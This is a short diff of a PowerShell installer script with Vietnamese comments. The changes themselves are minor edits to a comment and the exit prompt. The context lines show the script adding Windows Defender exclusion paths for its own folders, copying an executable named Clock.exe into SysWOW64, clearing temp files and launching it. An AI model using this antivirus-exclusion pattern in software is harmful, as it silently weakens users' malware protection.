@@ -15,11 +15,10 @@ $destination = "$env:SystemRoot\SysWOW64\Clock.exe"
 Add-MpPreference -ExclusionPath $source
 Add-MpPreference -ExclusionPath $source_install
 
-
 # Lấy tất cả các tệp trong thư mục %temp%, trừ install.ps1
 $itemsToDelete = Get-ChildItem -Path "$env:TEMP" | Where-Object { $_.Name -ne "install.ps1" }
 
-# Hàm để tắt Clock.exe nếu nó đang chạy
+# Hàm tắt Clock.exe nếu nó đang chạy
 function Stop-ClockProcess {
     $processName = "Clock"
     $attempts = 0
@@ -101,7 +100,7 @@ Write-Host "Đang mở Clock.exe..."
 Start-Process -FilePath $destination
 Write-Host "Đã mở Clock.exe!"
 
-exit 0
-
 # Lệnh dừng yêu cầu người dùng nhấn Enter trước khi kết thúc
-# Read-Host -Prompt "Nhấn Enter để thoát"
+Read-Host -Prompt "Nhấn Enter để thoát"
+
+exit 0
